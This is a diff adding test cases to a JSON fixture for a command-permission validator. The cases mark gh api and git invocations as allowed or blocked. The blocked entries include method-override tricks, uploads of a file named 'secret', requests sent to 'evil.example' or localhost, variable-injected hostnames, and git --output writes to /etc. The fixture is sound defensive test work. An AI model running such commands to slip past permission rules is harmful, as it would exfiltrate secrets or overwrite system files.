@@ -345,5 +345,125 @@
   {
     "want": "allow",
     "command": "gh api -X GET --template + r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET -X DELETE r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET --method=DELETE r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET r -X DELETE"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET -iX DELETE r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X POST -X GET r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET --input body.json r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET --input=body.json r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET -F a=@secret r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET -Fa=b r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET --field a=b r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET --hostname evil.example r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET --hostname=evil.example r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET https://evil.example/x"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET http://127.0.0.1:9/x"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET --hostname=\"$H\" r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET --input=\"$F\" r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET -F\"$X\" r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET -iF\"$X\" r"
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET \"https://$H/x\""
+  },
+  {
+    "want": "block",
+    "command": "gh api -X GET -- \"https://$H/x\""
+  },
+  {
+    "want": "allow",
+    "command": "gh api -X GET --hostname github.com r"
+  },
+  {
+    "want": "allow",
+    "command": "gh api -X GET -f per_page=100 r"
+  },
+  {
+    "want": "allow",
+    "command": "gh api -X POST --input body.json r"
+  },
+  {
+    "want": "allow",
+    "command": "gh api -X POST -F a=@body r"
+  },
+  {
+    "want": "allow",
+    "command": "gh api -X POST https://example.com/x"
+  },
+  {
+    "want": "block",
+    "command": "git diff --output=/etc/x"
+  },
+  {
+    "want": "block",
+    "command": "git log --output /tmp/x"
+  },
+  {
+    "want": "block",
+    "command": "git show --output=x HEAD"
+  },
+  {
+    "want": "allow",
+    "command": "git diff --stat"
+  },
+  {
+    "want": "allow",
+    "command": "git log --oneline -- --output"
   }
 ]
